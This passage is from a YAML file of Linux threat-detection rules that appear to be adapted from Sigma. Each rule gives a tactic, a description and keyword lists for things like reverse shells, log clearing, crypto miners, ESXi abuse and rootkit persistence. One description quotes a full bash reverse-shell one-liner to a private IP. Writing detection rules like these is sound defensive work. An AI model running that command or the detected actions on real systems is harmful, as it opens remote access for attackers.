  tactic: execution
  description: Detects suspicious shell commands or program code that may be executed
    or used in command line to establish a reverse shell
  conditions:
    summary:
      regex_any:
      - suspicious
      - reverse
      - shell
      - command
      - line
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ec2c8b4_557a_4121_b87c_5dfb3a602fae
  intent: execution
  tactic: execution
  description: Detects suspicious command sequence that JexBoss
  conditions:
    summary:
      regex_any:
      - jexboss
      - command
      - sequence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c67fc22a_0be5_4b4f_aad5_2b32c4b69523
  intent: execution
  tactic: execution
  description: Detects suspicious command lines that look as if they would create
    symbolic links to /etc/passwd
  conditions:
    summary:
      regex_any:
      - symlink
      - passwd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_00eee2a5_fdb0_4746_a21d_e43fbdea5681
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of doas.conf file in linux host platform.
  conditions:
    summary:
      regex_any:
      - linux
      - doas
      - conf
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c4e2f43_d94d_4ead_b64d_97e53fa2bd05
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of cron file or files in Cron directories which could
    indicates potential persistence.
  conditions:
    summary:
      regex_any:
      - persistence
      - cron
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ddb26b76_4447_4807_871f_1b035b2bfa5d
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of sudoers file or files in "sudoers.d" directory
    which can be used a potential method to persiste privileges for a specific user.
  conditions:
    summary:
      regex_any:
      - persistence
      - sudoers
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c0239255_822c_4630_b7f1_35362bcb8f44
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of the file "rootlog" which is used by the TripleCross
    rootkit as a way to check if the backdoor is already running.
  conditions:
    summary:
      regex_any:
      - triple
      - cross
      - ebpf
      - rootkit
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a2ea919_d11d_4d1e_8535_06cda13be20f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d"
    directories. Which both are related to the TripleCross persistence method
  conditions:
    summary:
      regex_any:
      - triple
      - cross
      - ebpf
      - rootkit
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_35a05c60_9012_49b6_a11f_6bab741c9f74
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of wget to download content in a temporary directory
    such as "/tmp" or "/var/tmp"
  conditions:
    summary:
      regex_any:
      - wget
      - creating
      - files
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_83dcd9f6_9ca8_4af7_a16e_a1c7a6b51871
  intent: execution
  tactic: execution
  description: Detects a bash contecting to a remote IP address (often found when
    actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
  conditions:
    summary:
      regex_any:
      - linux
      - reverse
      - shell
      - indicator
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a46c93b7_55ed_4d27_a41b_c259456c4746
  intent: impact_operations
  tactic: impact
  description: Detects process connections to a Monero crypto mining pool
  conditions:
    summary:
      regex_any:
      - linux
      - crypto
      - mining
      - pool
      - connections
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4568f5d_131f_4e78_83d4_45b2da0ec4f1
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects an executable initiating a network connection to "LocaltoNet"
    tunneling sub-domains.

    LocaltoNet is a reverse proxy that enables localhost services to be exposed to
    the Internet.

    Attackers have been seen to use this service for command-and-control activities
    to bypass MFA and perimeter controls.

    '
  conditions:
    summary:
      regex_any:
      - communication
      - localtonet
      - tunneling
      - service
      - initiated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19bf6fdb_7721_4f3d_867f_53467f6a5db6
  intent: unknown
  tactic: s0508
  description: Detects an executable accessing an ngrok tunneling endpoint, which
    could be a sign of forbidden exfiltration of data exfiltration by malicious actors
  conditions:
    summary:
      regex_any:
      - communication
      - ngrok
      - tunneling
      - service
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dbfc7c98_04ab_4ab7_aa94_c74d22aa7376
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects programs that connect to known malware callback ports based
    on threat intelligence reports.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - malware
      - callback
      - communication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb382fd5_b454_47ea_a264_1828e4c766d6
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of the "apt" and "apt-get" commands to execute a shell
    or proxy commands.

    Such behavior may be associated with privilege escalation, unauthorized command
    execution, or to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - invocation
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bed26dea_4525_47f4_b24a_76e30e44ffb0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of ''auditctl'' with the ''-D'' command line
    parameter, which deletes all configured audit rules and watches on Linux systems.

    This technique is commonly used by attackers to disable audit logging and cover
    their tracks by removing monitoring capabilities.

    Removal of audit rules can significantly impair detection of malicious activities
    on the affected system.

    '
  conditions:
    summary:
      regex_any:
      - audit
      - rules
      - deleted
      - auditctl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36388120_b3f1_4ce9_b50b_280d9a7f4c04
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of the Kaspersky init.d stop script on Linux systems
    either directly or via systemctl.

    This activity may indicate a manual interruption of the antivirus service by an
    administrator, or it could be a sign of potential tampering or evasion attempts
    by malicious actors.

    '
  conditions:
    summary:
      regex_any:
      - kaspersky
      - endpoint
      - security
      - stopped
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c1a5675_cb85_452f_a298_b01b22a51856
  intent: execution
  tactic: execution
  description: 'Detects the execution of "awk" or it''s sibling commands, to invoke
    a shell using the system() function.

    This behavior is commonly associated with attempts to execute arbitrary commands
    or escalate privileges, potentially leading to unauthorized access or further
    exploitation.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - invocation
      - shell
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba592c6d_6888_43c3_b8c6_689b8fe47337
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious process command line that uses base64 encoded input
    for execution with a shell
  conditions:
    summary:
      regex_any:
      - linux
      - base64
      - encoded
      - pipe
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe2f9663_41cb_47e2_b954_8a228f3b9dff
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the presence of a base64 version of the shebang in the commandline,
    which could indicate a malicious payload about to be decoded
  conditions:
    summary:
      regex_any:
      - linux
      - base64
      - encoded
      - shebang
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8341cb2_ee25_43fa_a975_d8a5a9714b39
  intent: execution
  tactic: execution
  description: Detects the usage of the unsafe bpftrace option
  conditions:
    summary:
      regex_any:
      - bpftrace
      - unsafe
      - option
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7692f583_bd30_4008_8615_75dab3f08a99
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects common command used to enable bpf kprobes tracing
  conditions:
    summary:
      regex_any:
      - enable
      - kprobes
      - tracing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db1ac3be_f606_4e3a_89e0_9607cbe6b98a
  intent: execution
  tactic: execution
  description: 'Detects the use of the "capsh" utility to invoke a shell.

    '
  conditions:
    summary:
      regex_any:
      - capsh
      - shell
      - invocation
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34979410_e4b5_4e5d_8cfb_389fdff05c12
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the 'chattr' utility to remove immutable file attribute.
  conditions:
    summary:
      regex_any:
      - remove
      - immutable
      - file
      - attribute
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_80915f59_9b56_4616_9de0_fd0dea6c12fe
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attempts to clear logs on the system. Adversaries may clear
    system logs to hide evidence of an intrusion
  conditions:
    summary:
      regex_any:
      - clear
      - linux
      - logs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3fcc9b35_39e4_44c0_a2ad_9e82b6902b31
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects specific commands commonly used to remove or empty the syslog.
    Which is a technique often used by attacker as a method to hide their tracks

    '
  conditions:
    summary:
      regex_any:
      - syslog
      - clearing
      - removal
      - system
      - utilities
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa4aaed5_4fe0_498d_bbc0_08e3346387ba
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when the file "passwd" or "shadow" is copied from tmp path
  conditions:
    summary:
      regex_any:
      - copy
      - passwd
      - shadow
      - from
      - path
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c2e234de_03a3_41e1_b39a_1e56dc17ba67
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of the ''crontab'' utility to remove the current crontab.

    This is a common occurrence where cryptocurrency miners compete against each other
    by removing traces of other miners to hijack the maximum amount of resources possible

    '
  conditions:
    summary:
      regex_any:
      - remove
      - scheduled
      - cron
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9069ea3c_b213_4c52_be13_86506a227ab1
  intent: impact_operations
  tactic: impact
  description: Detects command line parameters or strings often used by crypto miners
  conditions:
    summary:
      regex_any:
      - linux
      - crypto
      - mining
      - indicators
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2d9e2f3_0f43_4c7a_bcd9_9acfc0d723aa
  intent: execution
  tactic: execution
  description: 'Detects suspicious use of command-line tools such as curl or wget
    to download remote

    content - particularly scripts - into temporary directories (e.g., /dev/shm, /tmp),
    followed by

    immediate execution, indicating potential malicious activity. This pattern is
    commonly used

    by malicious scripts, stagers, or downloaders in fileless or multi-stage Linux
    attacks.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - download
      - execute
      - pattern
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7fb14105_530e_4e2e_8cfb_99f7d8700b66
  intent: execution
  tactic: execution
  description: Detects spawning of suspicious child processes by Atlassian Confluence
    server which may indicate successful exploitation of CVE-2022-26134
  conditions:
    summary:
      regex_any:
      - atlassian
      - confluence
      - '2022'
      - '26134'
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c8a5f584_cdc8_42cc_8cce_0398e4265de3
  intent: unknown
  tactic: initial_access
  description: Detects attempts to exploit an apache spark server via CVE-2014-6287
    from a commandline perspective
  conditions:
    summary:
      regex_any:
      - apache
      - spark
      - shell
      - command
      - injection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4cad6c64_d6df_42d6_8dae_eb78defdc415
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the injection of code by overwriting the memory map of a Linux
    process using the "dd" Linux command.
  conditions:
    summary:
      regex_any:
      - potential
      - linux
      - process
      - code
      - injection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84c9e83c_599a_458a_a0cb_0ecce44e807a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attempts to force stop the ufw using ufw-init
  conditions:
    summary:
      regex_any:
      - force
      - stop
      - using
      - init
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bed978f8_7f3a_432b_82c5_9286a9b3031a
  intent: execution
  tactic: execution
  description: 'Detects the use of the env command to invoke a shell. This may indicate
    an attempt to bypass restricted environments, escalate privileges, or execute
    arbitrary commands.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - invocation
      - command
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_33e814e0_1f00_4e43_9c34_31fb7ae2b174
  intent: execution
  tactic: execution
  description: Detects execution of the "esxcli" command with the "network" flag in
    order to retrieve information about the network configuration.
  conditions:
    summary:
      regex_any:
      - esxi
      - network
      - configuration
      - discovery
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9691f58d_92c1_4416_8bf3_2edd753ec9cf
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects execution of the "esxcli" command with the "system" and "permission"
    flags in order to assign admin permissions to an account.
  conditions:
    summary:
      regex_any:
      - esxi
      - admin
      - permission
      - assigned
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f41dada5_3f56_4232_8503_3fb7f9cf2d60
  intent: execution
  tactic: execution
  description: Detects execution of the "esxcli" command with the "storage" flag in
    order to retrieve information about the storage status and other related information.
    Seen used by malware such as DarkSide and LockBit.
  conditions:
    summary:
      regex_any:
      - esxi
      - storage
      - information
      - discovery
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_38eb1dbb_011f_40b1_a126_cf03a0210563
  intent: execution
  tactic: execution
  description: Detects changes to the ESXi syslog configuration via "esxcli"
  conditions:
    summary:
      regex_any:
      - esxi
      - syslog
      - configuration
      - change
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e80273e1_9faf_40bc_bd85_dbaff104c4e9
  intent: execution
  tactic: execution
  description: Detects execution of the "esxcli" command with the "system" flag in
    order to retrieve information about the different component of the system. Such
    as accounts, modules, NTP, etc.
  conditions:
    summary:
      regex_any:
      - esxi
      - system
      - information
      - discovery
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b28e4eb3_8bbc_4f0c_819f_edfe8e2f25db
  intent: execution
  tactic: execution
  description: Detects user account creation on ESXi system via esxcli
  conditions:
    summary:
      regex_any:
      - esxi
      - account
      - creation
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f1573a7_363b_4114_9208_ad7a61de46eb
  intent: execution
  tactic: execution
  description: Detects execution of the "esxcli" command with the "vm" flag in order
    to retrieve information about the installed VMs.
  conditions:
    summary:
      regex_any:
      - esxi
      - list
      - discovery
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2992ac4d_31e9_4325_99f2_b18a73221bb2
  intent: impact_operations
  tactic: impact
  description: Detects execution of the "esxcli" command with the "vm" and "kill"
    flag in order to kill/shutdown a specific VM.
  conditions:
    summary:
      regex_any:
      - esxi
      - kill
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d54c2f06_aca9_4e2b_81c9_5317858f4b79
  intent: execution
  tactic: execution
  description: Detects execution of the "esxcli" command with the "vsan" flag in order
    to retrieve information about virtual storage. Seen used by malware such as DarkSide.
  conditions:
    summary:
      regex_any:
      - esxi
      - vsan
      - information
      - discovery
      - esxcli
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6adfbf8f_52be_4444_9bac_81b539624146
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of the find command to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    exploitation attempt.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - find
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b09c71e_4269_4111_9cdd_107d8867f0cc
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of the "flock" command to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - flock
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b5de532_a757_4d70_946c_1f3e44f48b4d
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of the "gcc" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_47b3bbd4_1bf7_48cc_84ab_995362aaa75a
  intent: execution
  tactic: execution
  description: 'Detects the use of the "git" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a46f16c_8c4c_82d1_b121_0fdd3ba70a84
  intent: impact_operations
  tactic: impact
  description: Detects execution of the "groupdel" binary. Which is used to delete
    a group. This is sometimes abused by threat actors in order to cover their tracks
  conditions:
    summary:
      regex_any:
      - group
      - been
      - deleted
      - groupdel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_700fb7e8_2981_401c_8430_be58e189e741
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects installation of suspicious packages using system installation
    utilities
  conditions:
    summary:
      regex_any:
      - suspicious
      - package
      - installed
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3be619f4_d9ec_4ea8_a173_18fdd01996ab
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of iptables to flush all firewall rules, tables and chains
    and allow all network traffic
  conditions:
    summary:
      regex_any:
      - flush
      - iptables
      - chain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e34cfa0c_0a50_4210_9cb3_5632d08eb041
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of grep to discover specific files created by the GobRAT
    malware
  conditions:
    summary:
      regex_any:
      - potential
      - gobrat
      - file
      - discovery
      - grep
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_999c3b12_0a8c_40b6_8e13_dd7d62b75c7a
  intent: execution
  tactic: execution
  description: Detects the creation of a new named pipe using the "mkfifo" utility
    in a potentially suspicious location
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - named
      - pipe
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec52985a_d024_41e3_8ff6_14169039a0b3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the "mount" command with "hidepid" parameter to
    make invisible processes to other users from the system
  conditions:
    summary:
      regex_any:
      - mount
      - execution
      - with
      - hidepid
      - parameter
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f734ed0_4f47_46c0_837f_6ee62505abd9
  intent: execution
  tactic: execution
  description: Detects execution of netcat with the "-e" flag followed by common shells.
    This could be a sign of a potential reverse shell setup.
  conditions:
    summary:
      regex_any:
      - potential
      - netcat
      - reverse
      - shell
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_093d68c7_762a_42f4_9f46_95e79142571a
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of the "nice" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - nice
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4ffe466_6ff8_48d4_94bd_e32d1a6061e2
  intent: execution
  tactic: execution
  description: Detects usage of nohup which could be leveraged by an attacker to keep
    a process running or break out from restricted environments
  conditions:
    summary:
      regex_any:
      - nohup
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_457df417_8b9d_4912_85f3_9dbda39c3645
  intent: execution
  tactic: execution
  description: Detects execution of binaries located in potentially suspicious locations
    via "nohup"
  conditions:
    summary:
      regex_any:
      - suspicious
      - nohup
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6eea1bf6_f8d2_488a_a742_e6ef6c1b67db
  intent: execution
  tactic: execution
  description: 'Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute
    any UNIX/Linux script using the /bin/sh shell.

    Script being executed gets created as a temp file in /tmp folder with a scx* prefix.

    Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.

    The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft
    Operations Manager UNIX/Linux Agent, is now used in a host of products including

    Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management
    Suite.

    '
  conditions:
    summary:
      regex_any:
      - omigod
      - runasprovider
      - executescript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_21541900_27a9_4454_9c4c_3f0a4240344a
  intent: execution
  tactic: execution
  description: 'Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand
    to execute any UNIX/Linux command using the /bin/sh shell.

    SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now
    used in a host of products including

    Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management
    Suite.

    '
  conditions:
    summary:
      regex_any:
      - omigod
      - runasprovider
      - executeshellcommand
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_259df6bc_003f_4306_9f54_4ff1a08fa38e
  intent: execution
  tactic: execution
  description: Detects execution of the perl binary with the "-e" flag and common
    strings related to potential reverse shell activity
  conditions:
    summary:
      regex_any:
      - potential
      - perl
      - reverse
      - shell
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c6714a24_d7d5_4283_a36b_3ffd091d5f7e
  intent: execution
  tactic: execution
  description: 'Detects usage of the PHP CLI with the "-r" flag which allows it to
    run inline PHP code. The rule looks for calls to the "fsockopen" function which
    allows the creation of sockets.

    Attackers often leverage this in combination with functions such as "exec" or
    "fopen" to initiate a reverse shell connection.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - reverse
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_97de11cd_4b67_4abf_9a8b_1020e670aa9e
  intent: reconnaissance
  tactic: discovery
  description: 'Detects command line patterns associated with the use of Pnscan for
    sending and receiving binary data across the network.

    This behavior has been identified in a Linux malware campaign targeting Docker,
    Apache Hadoop, Redis, and Confluence and was previously used by the threat actor
    known as TeamTNT

    '
  conditions:
    summary:
      regex_any:
      - pnscan
      - binary
      - data
      - transmission
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7a650c4_226c_451e_948f_cc490db506aa
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects execution of TruffleHog, a tool used to search for secrets
    in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used
    maliciously.

    While it is a legitimate tool, intended for use in CI pipelines and security assessments,

    It was observed in the Shai-Hulud malware campaign targeting npm packages to steal
    sensitive information.

    '
  conditions:
    summary:
      regex_any:
      - trufflehog
      - execution
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3f0f5957_04f8_4792_ad89_192b0303bde6
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects the execution of Python web servers via command line interface
    (CLI).

    After gaining access to target systems, adversaries may use Python''s built-in
    HTTP server modules to quickly establish a web server without requiring additional
    software.

    This technique is commonly used in post-exploitation scenarios as it provides
    a simple method for transferring files between the compromised host and attacker-controlled
    systems.

    '
  conditions:
    summary:
      regex_any:
      - python
      - webserver
      - execution
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4042d54_110d_45dd_a0e1_05c47822c937
  intent: execution
  tactic: execution
  description: 'Detects a python process calling to the PTY module in order to spawn
    a pretty tty which could be indicative of potential reverse shell activity.

    '
  conditions:
    summary:
      regex_any:
      - python
      - spawning
      - pretty
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32e62bc7_3de0_4bb1_90af_532978fe42c0
  intent: execution
  tactic: execution
  description: 'Detects the execution of python with calls to the socket and pty module
    in order to connect and spawn a potential reverse shell.

    '
  conditions:
    summary:
      regex_any:
      - python
      - reverse
      - shell
      - execution
      - socket
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d2f44ff_4611_4778_a8fc_323a0e9850cc
  intent: execution
  tactic: execution
  description: 'Detects execution of inline Python code via the "-c" in order to call
    the "system" function from the "os" library, and spawn a shell.

    '
  conditions:
    summary:
      regex_any:
      - inline
      - python
      - execution
      - spawn
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e2326866_609f_4015_aea9_7ec634e8aa04
  intent: execution
  tactic: execution
  description: 'Detects the use of the "rsync" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - rsync
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_297241f3_8108_4b3a_8c15_2dda9f844594
  intent: execution
  tactic: execution
  description: 'Detects the execution of a shell as sub process of "rsync" without
    the expected command line flag "-e" being used, which could be an indication of
    exploitation as described in CVE-2024-12084. This behavior is commonly associated
    with attempts to execute arbitrary commands or escalate privileges, potentially
    leading to unauthorized access or further exploitation.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - invocation
      - shell
      - rsync
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b8bdac18_c06e_4016_ac30_221553e74f59
  intent: execution
  tactic: execution
  description: Detects execution of ruby with the "-e" flag and calls to "socket"
    related functions. This could be an indication of a potential attempt to setup
    a reverse shell
  conditions:
    summary:
      regex_any:
      - potential
      - ruby
      - reverse
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b14bac8_3e3a_4324_8109_42f0546a347f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects abuse of the cron utility to perform task scheduling for initial
    or recurring execution of malicious code. Detection will focus on crontab jobs
    uploaded from the tmp folder.
  conditions:
    summary:
      regex_any:
      - scheduled
      - cron
      - task
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3a8a052_111f_4606_9aee_f28ebeb76776
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling security tools
  conditions:
    summary:
      regex_any:
      - disabling
      - security
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_de25eeb8_3655_4643_ac3a_b662d3f26b6b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of utilities such as 'systemctl', 'service'...etc
    to stop or disable tools and services
  conditions:
    summary:
      regex_any:
      - disable
      - stop
      - services
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8737b7f6_8df3_4bb7_b1da_06019b99b687
  intent: execution
  tactic: execution
  description: 'Detects the use of the "ssh" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - shell
      - invocation
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f9b3edc5_3322_4fc7_8aa3_245d646cc4b7
  intent: persistence_installation
  tactic: persistence
  description: Detects potential Amazon SSM agent hijack attempts as outlined in the
    Mitiga research report.
  conditions:
    summary:
      regex_any:
      - potential
      - linux
      - amazon
      - agent
      - hijacking
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f74107df_b6c6_4e80_bf00_4170b658162b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287
  conditions:
    summary:
      regex_any:
      - sudo
      - privilege
      - escalation
      - '2019'
      - '14287'
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6419afd1_3742_47a5_a7e6_b50386cd15f8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects chmod targeting files in abnormal directory paths.
  conditions:
    summary:
      regex_any:
      - chmod
      - suspicious
      - directory
  weights:
    base: 0.6
